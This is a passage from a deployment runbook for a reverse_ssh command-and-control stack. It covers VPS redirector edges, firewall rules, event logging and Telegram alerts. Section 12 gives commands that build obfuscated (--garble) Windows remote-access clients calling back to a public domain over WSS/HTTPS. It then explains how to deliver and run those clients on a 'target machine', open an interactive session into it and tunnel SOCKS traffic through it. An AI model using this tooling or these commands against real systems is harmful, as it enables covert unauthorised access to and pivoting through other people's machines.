sudo iptables -S DOCKER-USER | grep RSSH_INGRESS_GUARD
```

Persist only after verifying access:

```sh
sudo netfilter-persistent save
```

## 11. Optional edge-logger

`edge-logger` is not used by the nginx WSS/HTTPS entrypoint. Use it only if
you explicitly choose a non-nginx TCP proxy path and accept a user-space TCP
proxy in the data path.

If enabled, point it at the same internal target:

```text
EDGE_LISTEN_ADDR=:443
EDGE_TARGET_ADDR=192.0.2.10:3232
VPS_NAME=vps-1
VPS_PUBLIC_IP=198.51.100.10
VPS_PUBLIC_PORT=443
EDGE_FORWARD_ENABLED=false
```

The systemd unit runs with a dynamic unprivileged user and grants only
`CAP_NET_BIND_SERVICE`, so it can bind `443/tcp` without broader root
privileges.

By default, edge events stay in `/var/lib/reverse-logger/edge_events.jsonl` on
the VPS. To forward them centrally, expose the logger only on the main
internal bind IP with `docker-compose.edge-forward.yml` and set:

```text
EDGE_FORWARD_ENABLED=true
EDGE_FORWARD_URL=http://192.0.2.10:8080/edge-events
EDGE_FORWARD_TOKEN=<EDGE_FORWARD_TOKEN_FROM_MAIN_ENV>
```

## 12. Generate Client and Connect Through reverse_ssh

Run this step only after one of the public VPS entrypoint paths is working:

- nginx WSS/HTTPS edge from step 8; or
- raw DNAT fallback from step 9.

For WSS/HTTPS, the public DNS record, TLS certificate, nginx route, SoftEther
path, and backend reachability must already be valid. Otherwise the generated
client will have a correct callback value but no reachable public endpoint.

If the VPS entrypoints are managed by Ansible, you can automate this section
from the main host with:

```sh
cd /opt/reverse-logger/deploy/ansible
ansible-playbook reverse-ssh-links.yml
```

For a combined VPS rollout followed by link generation:

```sh
ansible-playbook edge-and-links.yml
```

The playbook skips any VPS that is not fully configured yet: nginx must validate
successfully, `nginx` and `nginx-edge-forwarder` must be active, the forwarder
env file must contain the expected `RSSH_WS_PATH` and `RSSH_PUSH_PATH`, and TLS
files must exist unless `reverse_ssh_link_check_tls_files=false`.

For per-host random public paths, set `rssh_random_paths_enabled: true` in
`group_vars/vps_edge.yml`. The first run persists generated `/ws`, `/push`, and
download-prefix replacements in:

```text
deploy/ansible/.generated-paths/<inventory_hostname>.yml
```

Keep that directory private and backed up if you need repeatable redeploys.
Deleting a host file or running with `rssh_random_paths_regenerate=true`
generates new paths and requires new client links.

### 12.1 Connect to the catcher console

From the main server, load `.env` and connect:

```sh
cd /opt/reverse-logger
set -a
. ./.env
set +a

ssh -i ~/.ssh/reverse_ssh_operator \
  -p "${REVERSE_SSH_BIND_PORT:-3232}" \
  "$REVERSE_SSH_BIND_IP"
```

### 12.2 Generate the reverse_ssh client

Run inside the catcher console. The `--wss` and `--https` flags bake the
public transport scheme into the client. `REVERSE_SSH_EXTERNAL_ADDRESS` from
`.env` supplies the host and port unless `-s` is provided explicitly.

The listener paths are already applied to the Dockerized `reverse_ssh` server
through `REVERSE_SSH_WS_PATH` and `REVERSE_SSH_PUSH_PATH`. Use matching values
when generating clients.

Default WSS entrypoint:

```text
link --wss --ws-path /ws --push-path /push --name main
```

Default HTTPS polling entrypoint:

```text
link --https --ws-path /ws --push-path /push --name main
```

For custom public paths, first set matching values in `.env` before starting
or recreating `reverse_ssh`:

```text
REVERSE_SSH_WS_PATH=/rssh-ws
REVERSE_SSH_PUSH_PATH=/rssh-push
INGRESS_WS_PATH=/rssh-ws
INGRESS_PUSH_PATH=/rssh-push
```

Then recreate the listener:

```sh
docker compose \
  --env-file .env \
  -f docker-compose.yml \
  -f docker-compose.edge-forward.yml \
  up -d --force-recreate reverse_ssh rssh-logger
```

Recheck `webhook -l` after recreating `reverse_ssh` and restore the private
`http://rssh-logger:8080/hooks/<WEBHOOK_TOKEN>` registration if needed.

Use the same values in `link`:

```text
link --wss --ws-path /rssh-ws --push-path /rssh-push --name main
link --https --ws-path /rssh-ws --push-path /rssh-push --name main
```

For public VPS entrypoints, pass the public domain explicitly and include the
client build options used by the Ansible helper:

```text
link --wss -s entry1.example.com:443 --ws-path /track383211 --push-path /ping198287 --name edge1-wss-windows-amd64 --goos windows --goarch amd64 --garble --auto-proxy --use-kerberos
```

Check existing generated links before creating another one:

```text
link -l
```

Remove or rotate an old link by name or id:

```text
link -r edge1-wss-windows-amd64
```

The command prints a download URL. Copy that URL to the target machine,
download the generated client, and run it there. With the nginx edge, the URL
should be `https://<rssh_domain>/dl/<name>` on the nginx edge. In `link -l`, the `Url`
column is the binary download URL, while `Client Callback` is the callback
transport baked into the binary. With the TLS listener used by this stack, the
download URL should be `https://...`; WSS clients still show `wss://...` in
`Client Callback`.

If you run a standalone client manually instead of using `link`, use the same
public transport URL and paths:

```sh
./client -d wss://<rssh-domain>:443 --ws-path /ws
./client -d https://<rssh-domain>:443 --push-path /push
```

### 12.3 Confirm the client is connected

Run inside the catcher console:

```text
ls
```

Use the client id shown by `ls` in the next step.

### 12.4 Connect to the target through reverse_ssh

Interactive connection from the catcher console:

```text
connect <client-id>
```

OpenSSH jump mode from a host that can reach
`REVERSE_SSH_BIND_IP:REVERSE_SSH_BIND_PORT`:

```sh
ssh -i ~/.ssh/reverse_ssh_operator \
  -J "${REVERSE_SSH_BIND_IP}:${REVERSE_SSH_BIND_PORT:-3232}" \
  <client-id>
```

For a SOCKS tunnel through the connected client:

```sh
ssh -i ~/.ssh/reverse_ssh_operator \
  -D 9050 \
  -J "${REVERSE_SSH_BIND_IP}:${REVERSE_SSH_BIND_PORT:-3232}" \
  <client-id>
```

## 13. Configure Telegram Proxy

If the main server cannot reach Telegram directly, configure the proxy on a
VPS using [telegram-proxy.md](telegram-proxy.md). Then smoke-test from the main
server:

Alerts use `TELEGRAM_ALERT_MODE=html` by default. Set it to `rich` to use
Telegram Bot API 10.1 Rich Messages; if the API endpoint does not support
`sendRichMessage`, delivery falls back to the HTML `sendMessage` format.

```sh
telegram_curl_config="$(mktemp)"
chmod 600 "$telegram_curl_config"
trap 'rm -f "$telegram_curl_config"' EXIT

cat > "$telegram_curl_config" <<EOF
proxy = "$TELEGRAM_PROXY_URL"
url = "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe"
silent
show-error
EOF

curl --config "$telegram_curl_config"

first_chat_id="${TELEGRAM_CHAT_IDS%%,*}"
message="reverse_logger Telegram smoke test $(date -u +%FT%TZ)"

cat > "$telegram_curl_config" <<EOF
proxy = "$TELEGRAM_PROXY_URL"
url = "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
request = "POST"
data = "chat_id=${first_chat_id}"
data-urlencode = "text=${message}"
silent
show-error
EOF

curl --config "$telegram_curl_config"
```

## 14. Smoke Test

Send a sample webhook inside the Compose network:

```sh
docker compose exec rssh-logger wget -qO- \
  --post-data='{"Status":"connected","ID":"sample","IP":"203.0.113.10:50000","HostName":"user.host","Version":"test","Timestamp":"2026-06-09T12:00:00Z"}' \
  --header='Content-Type: application/json' \
  "http://127.0.0.1:8080/hooks/${WEBHOOK_TOKEN}"
```

Check durable logs:

```sh
tail -n 5 /opt/reverse-logger/data/logger/events.jsonl
sqlite3 /opt/reverse-logger/data/logger/events.db 'select status, host_name, ip_raw, received_at from events order by id desc limit 5;'
```

If `DASHBOARD_TOKEN` is set and the logger port is published, smoke-test the
dashboard API from the main host:

```sh
curl -H "Authorization: Bearer ${DASHBOARD_TOKEN}" \
  "http://${LOGGER_BIND_IP:-127.0.0.1}:${LOGGER_BIND_PORT:-8080}/dashboard/api/overview?window=24h"
```

Then test the real public path for the selected entrypoint mode.

For nginx WSS/HTTPS:

1. Confirm `https://<rssh_domain>/not-a-transport-path` redirects to
   `redirect_target`.
2. Generate and run a WSS or HTTPS polling client from step 12.
3. Confirm the reverse_ssh webhook event arrives. An ingress row plus a
   reconciler `live=1` snapshot without a new row in `events` means webhook
   delivery failed; it is not an ingress matcher failure.
4. Check central ingress and enriched logs:

```sh
tail -n 5 /opt/reverse-logger/data/logger/ingress_events.jsonl
tail -n 5 /opt/reverse-logger/data/logger/enriched_events.jsonl
sqlite3 /opt/reverse-logger/data/logger/events.db \
  'select correlation_status, status, reverse_ssh_id, real_client_ip, transport, received_at from enriched_events order by id desc limit 5;'
```

For the raw DNAT fallback:

1. Connect from outside to `VPS_PUBLIC_IP:443`.
2. Confirm the reverse_ssh webhook event arrives.
3. Check `ip_raw` in JSONL or SQLite.
4. If `ip_raw` is the real client IP, keep plain DNAT.
5. If `ip_raw` is a VPS/VPN IP, either accept that limitation or enable
   optional VPS-side connection logging.

## 15. Optional systemd Installation

After manual validation:

```sh
sudo cp deploy/systemd/rssh-monitor.service /etc/systemd/system/rssh-monitor.service
sudo systemctl daemon-reload
sudo systemctl enable rssh-monitor
sudo systemctl start rssh-monitor
```

Optional failed-attempt journal forwarding from the main host:

```sh
go build -trimpath -ldflags="-s -w" -o /tmp/rssh-error-forwarder ./cmd/rssh-error-forwarder
sudo install -m 0755 /tmp/rssh-error-forwarder /usr/local/bin/rssh-error-forwarder
sudo cp deploy/systemd/rssh-error-forwarder.env.example /etc/reverse-logger/rssh-error-forwarder.env
sudo nano /etc/reverse-logger/rssh-error-forwarder.env
sudo cp deploy/systemd/rssh-error-forwarder.service /etc/systemd/system/rssh-error-forwarder.service
sudo systemctl daemon-reload
sudo systemctl enable --now rssh-error-forwarder
```

Set `RSSH_ERROR_FORWARD_URL` to the main logger
`/reverse-ssh-errors` endpoint and use the same `EDGE_FORWARD_TOKEN` value as
the central logger. For Docker-based `reverse_ssh`, set
`RSSH_JOURNAL_COMMAND=docker logs -f --since=0s reverse_ssh`.

Check:

```sh
systemctl status rssh-monitor
journalctl -u rssh-monitor -n 100 --no-pager
systemctl status rssh-error-forwarder
journalctl -u rssh-error-forwarder -n 100 --no-pager
```

## Rollback

Main server:

```sh
cd /opt/reverse-logger
docker compose down
sudo systemctl disable --now rssh-monitor || true
```

VPS:

```sh
sudo iptables -t nat -F RSSH_VPS_PREROUTING || true
sudo iptables -t nat -F RSSH_VPS_POSTROUTING || true
sudo iptables -F RSSH_VPS_FORWARD || true
sudo systemctl disable --now edge-health || true
sudo netfilter-persistent save
```

Then remove or disable:

- VPS DNAT/firewall rules;
- SoftEther account/session for affected VPS nodes;
- Telegram proxy credentials;
- any manually installed `edge-logger` or `edge-health` systemd units.
